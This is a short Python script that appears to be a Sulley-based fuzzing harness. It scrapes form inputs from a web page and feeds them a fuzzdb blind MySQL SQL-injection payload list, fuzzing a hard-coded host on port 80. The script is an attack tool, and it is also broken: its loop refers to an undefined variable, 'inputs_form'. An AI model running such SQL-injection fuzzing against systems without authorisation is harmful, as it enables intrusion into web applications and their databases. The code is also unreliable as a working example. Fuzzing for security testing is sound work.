from sulley import *
from utils.html_parser import *
from requests.form_post import form_post_requests


html_url = "http://www.hhserver.com/test.html"
html = get_html(html_url)
parser = HtmlParser(html)
forms = parser.find_inputs_in_forms()

datas = {
    "default": "../fuzzdb/attack-payloads/sql-injection/payloads-sql-blind/payloads-sql-blind-MySQL-WHERE.txt",
}

form_post_requests(forms, datas)

sess = sessions.session(sleep_time = 0.0001)
target = sessions.target("192.168.144.104", 80)
sess.add_target(target)

count = 0
for form in inputs_form:
    sess.connect(sess.root, s_get("HTTP VERBS POST" + str(count)))
    count = count + 1


sess.fuzz()


